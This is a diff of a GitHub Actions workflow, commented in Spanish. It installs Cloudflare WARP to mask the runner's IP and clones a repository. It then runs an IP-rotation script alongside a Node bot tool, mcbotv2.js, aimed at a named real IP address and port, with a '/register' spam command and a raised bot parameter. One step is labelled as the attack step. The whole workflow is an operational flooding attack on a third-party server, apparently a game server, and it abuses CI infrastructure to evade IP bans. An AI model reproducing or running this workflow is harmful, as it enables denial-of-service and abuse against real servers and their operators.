@@ -8,36 +8,21 @@ jobs:
     timeout-minutes: 5
     
     steps:
-      - name: Instalar y activar Cloudflare WARP
+      - name: Instalar Cloudflare WARP
         run: |
-          # 1. Agregar repositorio oficial de Cloudflare
-          curl -fsSL https://pkg.cloudflareclient.com/pubkey.gpg | sudo gpg --yes --dearmor -o /usr/share/keyrings/cloudflare-warp-archive-keyring.gpg
-          echo "deb [arch=amd64 signed-by=/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg] https://pkg.cloudflareclient.com/ $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/cloudflare-client.list
-          
-          # 2. Actualizar e instalar de forma silenciosa
-          sudo apt-get update -y
-          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y cloudflare-warp
-          
-          # 3. Forzar el inicio del demonio en segundo plano
-          (sudo nohup warp-svc > /dev/null 2>&1 &)
-          sleep 3
-          
-          # 4. Registrar, conectar y verificar IP
-          yes | sudo warp-cli --accept-tos registration new
-          sudo warp-cli --accept-tos connect
-          sudo warp-cli --accept-tos mode warp+doh
-          echo -n "Tu IP asignada con VPN es: "
-          curl -s ifconfig.me
-          echo ""
+          curl -fsSL https://pkg.cloudflareclient.com/pubkey.gpg | sudo gpg --yes --dearmor -o /usr/share/keyrings/cloudflare-warp-archive-keyring.gpg && echo "deb [arch=amd64 signed-by=/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg] https://pkg.cloudflareclient.com/ $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/cloudflare-client.list && sudo apt-get update -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y cloudflare-warp && (sudo systemctl enable warp-svc && sudo systemctl start warp-svc || sudo nohup warp-svc > /dev/null 2>&1 &) && sleep 3 && yes | sudo warp-cli --accept-tos registration new && sudo warp-cli --accept-tos connect && sudo warp-cli --accept-tos mode warp+doh
           
       - name: Clonar repositorio
         run: |
           git clone https://github.com/ricardocraft121-gif/ssh2.git
+          cd ssh2
+          chmod +x change_ip.sh
           
-      - name: Entrar y ejecutar ataque
+      - name: Ejecutar change_ip.sh y atacar
         run: |
           cd ssh2
-          node mcbotv2.js 131.196.198.112 25575 13444 15 "/register hawia*sna|Hoaolsozozosiaoaoaooakamlwosmskoslsloskksksksk" 2
+          ./change_ip.sh &
+           node mcbotv2.js 45.126.208.51 25575 13444 300 "/register hawia*sna|Hoaolsozozosiaoaoaooakamlwosmskoslsloskksksksk" 2
           
       - name: Limpiar
         if: always()
